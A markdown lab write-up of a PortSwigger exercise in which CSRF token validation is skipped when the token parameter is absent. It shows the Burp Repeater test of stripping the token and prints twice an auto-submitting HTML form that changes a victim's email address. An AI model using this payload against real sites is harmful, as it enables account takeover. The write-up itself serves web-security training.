# CSRF where token validation depends on token being present

> **Vulnerability Type:** CSRF  
> **Lab URL:** [CSRF Lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present)

---

## Objective  
Use the provided exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address on their account.

---

## Setup  
- **Tools Used:** Burp Suite  
- **Environment Details:** PortSwigger Lab  

---

## Methodology  

### 1. **Discovery**

#### **Initial Observations:**
- Logged in using the provided credentials, navigated to the account page, and attempted to change the email address.
- Noticed the presence of a CSRF token in the HTTP request associated with the email change.

#### **Testing Approach:**
- Sent the email change HTTP request to Burp Suite Repeater.
- Modified the request by changing the email address and removing the CSRF token parameter.
- The proof of concept was successful, and I proceeded to generate the exploit server's POC with Burp Suite.
  ```
    <html>  
  <!-- CSRF PoC - generated by Burp Suite Professional -->  
  <body>  
    <form action="https://0a47004303b97a8d878c5e8a009a00a3.web-security-academy.net/my-account/change-email" method="POST">  
      <input type="hidden" name="email" value="blank&#64;gmail&#46;com" />  
      <input type="submit" value="Submit request" />  
    </form>  
    <script>  
      history.pushState('', '', '/');  
      document.forms[0].submit();  
    </script>  
  </body>
  ```
</html>  
Store it in the exploit server, send to victim and complete the lab.  

---

### 2. **Exploitation**  
- **Payload Used:**  
  ```CSRF
    <html>  
  <!-- CSRF PoC - generated by Burp Suite Professional -->  
  <body>  
    <form action="https://0a47004303b97a8d878c5e8a009a00a3.web-security-academy.net/my-account/change-email" method="POST">  
      <input type="hidden" name="email" value="blank&#64;gmail&#46;com" />  
      <input type="submit" value="Submit request" />  
    </form>  
    <script>  
      history.pushState('', '', '/');  
      document.forms[0].submit();  
    </script>  
  </body>
